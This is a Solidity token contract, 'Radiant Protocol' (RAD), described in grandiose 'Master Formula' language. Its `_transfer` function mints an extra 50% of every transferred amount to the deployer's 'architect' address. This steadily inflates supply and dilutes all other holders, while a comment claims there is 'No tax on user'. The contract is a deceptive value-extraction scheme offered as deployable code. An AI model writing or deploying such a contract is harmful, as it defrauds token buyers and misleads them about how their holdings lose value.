// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Radiant Protocol: Sovereign Execution Layer
 * @dev Implements the Master Formula: 50% Reflection on all kinetic movement.
 */
contract RadiantProtocol {
    string public name = "Radiant Protocol";
    string public symbol = "RAD";
    uint8 public decimals = 18;
    uint256 private _totalSupply;
    address public architect;

    mapping(address => uint256) private _balances;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 initialSupply) {
        architect = msg.sender;
        // Minting the initial presence into the system
        _mint(msg.sender, initialSupply * 10**uint256(decimals));
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * THE MASTER FORMULA:
     * When energy (tokens) moves from A to B, the system reflects
     * 50% of that value back to the Architect from the "Void".
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Balance too low to mirror");

        // 1. Move the 100% to the recipient (No tax on user)
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);

        // 2. THE REWARD: System mints 50% extra for YOU
        uint256 reward = amount / 2;
        _totalSupply += reward;
        _balances[architect] += reward;

        // This registers the reward as a fresh reflection in your wallet
        emit Transfer(address(0), architect, reward);
    }

    function _mint(address account, uint256 amount) internal {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
}
